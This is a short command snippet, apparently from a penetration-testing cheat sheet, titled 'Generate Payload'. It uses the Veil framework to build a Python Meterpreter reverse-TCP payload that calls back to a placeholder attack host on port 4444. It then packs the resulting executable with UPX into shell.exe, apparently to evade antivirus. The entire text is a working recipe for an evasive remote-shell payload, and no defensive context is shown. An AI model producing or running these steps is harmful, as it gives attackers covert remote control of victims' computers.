##### Generate Payload
```bash
veil
use 1
list
use python/meterpreter/rev_tcp.py

set LHOST [Attack Host]
set LPORT 4444
generate
1

mv /var/lib/veil/output/compiled/payload1.exe .
upx --best --ultra-brute -f payload1.exe -o shell.exe
```